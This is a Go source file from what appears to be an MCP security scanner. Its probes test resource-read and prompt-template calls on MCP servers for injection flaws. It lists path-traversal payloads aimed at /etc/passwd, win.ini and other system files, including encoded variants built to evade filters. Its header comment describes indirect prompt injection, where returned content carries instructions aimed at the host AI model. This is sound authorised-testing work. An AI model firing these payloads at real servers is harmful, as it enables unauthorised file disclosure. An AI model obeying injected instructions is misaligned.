// Package mcpprimitive provides security probes for the MCP content-bearing
// primitives BEYOND the tool surface — resources (resources/read) and prompt
// templates (prompts/get). It targets the parameters a client controls on those
// two calls, which are injection sinks no existing probe reaches:
//
//   - ResourceInjection attacks the resource URI: filesystem traversal (arbitrary
//     file read) and scheme abuse that turns resources/read into a server-side
//     request forgery primitive.
//   - PromptTemplateInjection attacks prompt-template arguments: server-side template
//     evaluation (SSTI/eval) and OS-command execution in the renderer.
//
// Both probes additionally score the CONTENT the server returns for smuggled
// model-directed instructions via the secondary mcpprimitive.ContentInjection
// detector — the indirect-injection / RADE class (OWASP MCP10), where a resource
// body or rendered template carries instructions aimed at the host model rather
// than at the human reader.
//
// Sibling packages: internal/probes/mcptool attacks the tool surface through
// types.ToolInvoker; internal/probes/mcptransport bypasses the protocol entirely
// with raw HTTP. This package uses types.MCPPrimitiveReader for content retrieval
// and types.MCPReconnaissance for catalog discovery. Shared payload construction
// and the out-of-band collector live in internal/mcpprobe.
//
// SIDE EFFECTS: these probes call REAL protocol methods on the target. Both
// resources/read and prompts/get are read-oriented by design, so unlike the tool
// probes there is no destructive-tool gate to apply — but a prompt renderer that
// shells out will EXECUTE the OS-command payloads this package sends, which is
// the point of the test. Point it only at systems you are authorised to attack.
package mcpprimitive

import (
	"context"
	"strings"

	mcpx "github.com/praetorian-inc/augustus/internal/recon/mcp"
	"github.com/praetorian-inc/augustus/pkg/recon"
	"github.com/praetorian-inc/augustus/pkg/types"
)

// reconContext is embedded by mcpprimitive probes to consume shared
// reconnaissance. It provides the ContextAwareProbe opt-in plus an inventory
// resolver that prefers a prior recon.MCP inventory over a second live
// enumeration.
type reconContext struct {
	store *recon.Store
}

// SetContext implements recon.ContextAwareProbe. The scan runner calls it once,
// before Probe(), with the shared observation store.
func (r *reconContext) SetContext(pc recon.ProbeContext) { r.store = pc.Recon }

// resolveInventories returns the target's MCP inventories, preferring those a
// prior recon phase already gathered and falling back to a live enumeration via
// types.MCPReconnaissance. A target that is neither described by recon nor
// capable of reconnaissance yields (nil, nil): the caller decides whether that is
// a legitimate empty result or a hard error.
//
// Callers must NOT treat an empty catalog as proof the target serves no
// resources. recon gates enumeration on the server's DECLARED capabilities and
// treats a failed list call as an empty one, so a server that serves resources
// without advertising the capability enumerates to nothing. ResourceInjection
// therefore always sends its baseline payload set regardless of what the catalog
// contains.
func (r *reconContext) resolveInventories(ctx context.Context, gen types.Generator) ([]*types.MCPInventory, error) {
	if r.store != nil {
		if invs := mcpx.InventoriesFrom(r.store); len(invs) > 0 {
			return invs, nil
		}
	}
	rec, ok := gen.(types.MCPReconnaissance)
	if !ok {
		return nil, nil
	}
	inv, err := rec.MCPInventory(ctx)
	if err != nil {
		return nil, err
	}
	if inv == nil {
		return nil, nil
	}
	return []*types.MCPInventory{inv}, nil
}

// fileSignatures are the stable content markers only a real read of the
// corresponding system file could produce. A server that echoes the requested URI
// back cannot forge them, which is what makes signature matching a deterministic,
// low-false-positive oracle (the same design the mcptool path-traversal probe
// uses).
//
// Choosing a signature is a precision decision, not a completeness one: a marker
// that also occurs in ordinary served content turns the oracle into a guess. So
// /etc/os-release is keyed on its distinctive assignments and NOT on a bare "ID=",
// which matches CLIENT_ID=, UUID= or an echoed ?ID= query; and /etc/hosts is keyed
// on its header and broadcast entry, not on "127.0.0.1 localhost", which appears in
// perfectly normal documentation.
var (
	passwdSignatures      = []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}
	winIniSignatures      = []string{"[extensions]", "[fonts]"}
	procVersionSignatures = []string{"Linux version "}
	osReleaseSignatures   = []string{"PRETTY_NAME=", "ID_LIKE=", "VERSION_ID="}
	hostsSignatures       = []string{"# Host Database", "broadcasthost"}
)

// uriPayload pairs a resource URI to request with the signatures its returned
// content must contain to prove the read escaped its intended scope.
type uriPayload struct {
	uri        string
	signatures []string
	// class labels how the payload attacks the URI, for report grouping.
	class string
}

// Payload classes recorded in attempt metadata.
const (
	classTraversal       = "resource-traversal"
	classTemplateArg     = "resource-template-arg"
	classSSRF            = "resource-ssrf"
	classResourceContent = "resource-content"
	classPromptSSTI      = "prompt-template-injection"
	classPromptOOBCmd    = "prompt-command-injection"
	classPromptContent   = "prompt-content"
)

// baselineURIPayloads are tried against every target regardless of what the
// catalog advertises, because a server may serve resources it never declared (see
// resolveInventories). They cover absolute reads, traversal from a relative base,
// and the encoded variants that defeat naive string filters.
func baselineURIPayloads() []uriPayload {
	out := []uriPayload{
		{uri: "file:///etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "file://../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "file:///../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "/etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: passwdSignatures, class: classTraversal},
		{uri: "file:///etc/passwd%00.txt", signatures: passwdSignatures, class: classTraversal},
		{uri: "file:///C:/windows/win.ini", signatures: winIniSignatures, class: classTraversal},
		{uri: "file:///windows/win.ini", signatures: winIniSignatures, class: classTraversal},
		{uri: "..\\..\\..\\..\\..\\..\\windows\\win.ini", signatures: winIniSignatures, class: classTraversal},

		// Diversifying the TARGET matters as much as diversifying the encoding. Every
		// payload above names passwd or win.ini, so a single server-side filter rule
		// ("reject any URI containing passwd") defeats the whole set at once no matter
		// how it is encoded. These alternates are deliberately few — one or two
		// encodings each rather than the full spread — because the baseline is sent to
		// every target and each entry is a request.
		{uri: "file:///proc/version", signatures: procVersionSignatures, class: classTraversal},
		{uri: "../../../../../../proc/version", signatures: procVersionSignatures, class: classTraversal},
		{uri: "file:///etc/os-release", signatures: osReleaseSignatures, class: classTraversal},
		{uri: "../../../../../../etc/os-release", signatures: osReleaseSignatures, class: classTraversal},
		{uri: "file:///etc/hosts", signatures: hostsSignatures, class: classTraversal},
	}
	return out
}

// traversalFrom derives traversal payloads from an advertised resource URI by
// replacing its final path segment with a traversal chain. A server that
// validates the scheme or a directory prefix but then joins the rest of the URI
// onto a base path accepts these where a bare "file:///etc/passwd" is rejected —
// the same prefix-preserving idea the tool path-traversal probe applies to
// disclosed sandbox prefixes.
func traversalFrom(advertised string) []uriPayload {
	idx := strings.LastIndex(advertised, "/")
	if idx <= 0 || idx == len(advertised)-1 {
		return nil
	}
	base := advertised[:idx+1]
	return []uriPayload{
		{uri: base + "../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: base + "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: passwdSignatures, class: classTraversal},
		{uri: base + "....//....//....//....//....//....//etc/passwd", signatures: passwdSignatures, class: classTraversal},
		// One alternate Unix target and one Windows target, for the same filter-evasion
		// reason as the baseline — and because a Windows host with a prefix check would
		// otherwise never see a prefix-preserving payload it could fall for. Held to two
		// extra entries: this set is emitted PER advertised resource (bounded by
		// resource_max_targets), so each addition costs a request per resource rather
		// than one per scan.
		{uri: base + "../../../../../../proc/version", signatures: procVersionSignatures, class: classTraversal},
		{uri: base + "../../../../../../windows/win.ini", signatures: winIniSignatures, class: classTraversal},
	}
}

// expandTemplate renders a URI template with value substituted for every variable,
// honouring the RFC 6570 operators. Returns "" when the template carries no
// placeholder.
//
// Operator handling matters for reach, not neatness: raw-substituting the whole
// expression turns "https://svc/search{?q}" into "https://svc/searchVALUE", which
// the server's template matcher rejects before the payload gets anywhere near the
// sink — so a vulnerable query-style template would be silently missed.
func expandTemplate(tpl, value string) string {
	if !strings.Contains(tpl, "{") {
		return ""
	}
	var b strings.Builder
	rest := tpl
	for {
		start := strings.Index(rest, "{")
		if start < 0 {
			b.WriteString(rest)
			break
		}
		end := strings.Index(rest[start:], "}")
		if end < 0 {
			b.WriteString(rest)
			break
		}
		b.WriteString(rest[:start])
		b.WriteString(expandExpression(rest[start+1:start+end], value))
		rest = rest[start+end+1:]
	}
	return b.String()
}

// expandExpression renders one template expression — the text between the braces,
// operator included — substituting value for each variable it names.
func expandExpression(expr, value string) string {
	if expr == "" {
		return ""
	}
	var op byte
	switch expr[0] {
	case '+', '#', '.', '/', ';', '?', '&':
		op = expr[0]
		expr = expr[1:]
	}

	var names []string
	for _, n := range strings.Split(expr, ",") {
		n = strings.TrimSuffix(strings.TrimSpace(n), "*") // explode modifier
		if i := strings.Index(n, ":"); i >= 0 {
			n = n[:i] // prefix modifier
		}
		if n != "" {
			names = append(names, n)
		}
	}
	if len(names) == 0 {
		return ""
	}

	values := make([]string, len(names))
	for i := range values {
		values[i] = value
	}
	pairs := make([]string, len(names))
	for i, n := range names {
		pairs[i] = n + "=" + value
	}

	switch op {
	case '#':
		return "#" + strings.Join(values, ",")
	case '.':
		return "." + strings.Join(values, ".")
	case '/':
		return "/" + strings.Join(values, "/")
	case ';':
		return ";" + strings.Join(pairs, ";")
	case '?':
		return "?" + strings.Join(pairs, "&")
	case '&':
		return "&" + strings.Join(pairs, "&")
	default: // simple ("") and reserved ("+") expansion
		return strings.Join(values, ",")
	}
}

// promptArgs builds the argument map for one prompts/get call: the payload in
// injectArg, and a benign placeholder for every other declared argument so the
// render reaches the sink instead of failing argument validation.
//
// Unlike tool arguments, MCP prompt arguments carry NO type information — the
// spec declares them as name/description/required only — so there is no schema to
// consult and every value is a string. That is why this cannot reuse the
// tool-schema helpers in internal/probes/mcptool.
func promptArgs(args []types.MCPPromptArgument, injectArg, payload string) map[string]string {
	out := map[string]string{injectArg: payload}
	for _, a := range args {
		if a.Name == injectArg || !a.Required {
			continue
		}
		out[a.Name] = "test"
	}
	return out
}
